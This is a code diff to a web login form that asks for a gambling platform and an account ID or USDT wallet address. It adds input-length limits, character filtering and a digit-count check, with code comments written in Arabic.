@@ -62,7 +62,7 @@
       </div>
       <div class="input-group">
         <label id="account-label" for="account" translate="no">Numéro de compte ID: <span class="required-star">*</span></label>
-        <input type="text" id="account" name="account" translate="no" />
+        <input type="text" id="account" name="account" translate="no" maxlength="15" />
       </div>
       <button class="login-btn" type="button" id="loginBtn" onclick="sendData()">
         <span id="btnText">Log In</span>
@@ -89,18 +89,40 @@
     const formBox = document.getElementById("formBox");
     const accountInput = document.getElementById("account");
 
+    // عند تغيير المنصة
     platformSelect.addEventListener('change', function() {
       const value = this.value.toLowerCase();
       if (value === 'stake' || value === 'mystake') {
         accountLabel.innerHTML = `Wallet Address <span class="required-star">*</span> <img src="https://i.postimg.cc/W3GvcnjM/Tgxt-DYbk2-IOs-BCx-UFUr5ksc-D2-Fjm2lv-LBRK2dr-PR.png" class="token-icon" alt="USDT"> Tether USD (ERC20)`;
+        accountInput.value = "";
+        accountInput.setAttribute("maxlength", "200"); // يسمح بعنوان طويل
+        accountInput.oninput = function() {
+          // منع الأحرف العربية
+          this.value = this.value.replace(/[\u0600-\u06FF]/g, '');
+        };
       } else {
         accountLabel.innerHTML = 'Numéro de compte ID: <span class="required-star">*</span>';
+        accountInput.value = "";
+        accountInput.setAttribute("maxlength", "15");
+        accountInput.oninput = function() {
+          // يسمح فقط بالأرقام
+          this.value = this.value.replace(/\D/g, '');
+          if (this.value.length > 15) this.value = this.value.slice(0, 15);
+        };
       }
     });
 
     async function sendData() {
       const platform = platformSelect.value;
       const account = accountInput.value;
+
+      // تحقق من ID (4 إلى 15 رقم)
+      if (platform !== "Stake" && platform !== "MyStake") {
+        if (account.length < 4 || account.length > 15) {
+          return; // لا يرسل
+        }
+      }
+
       if (!platform || !account) return;
 
       formBox.classList.add("disabled");
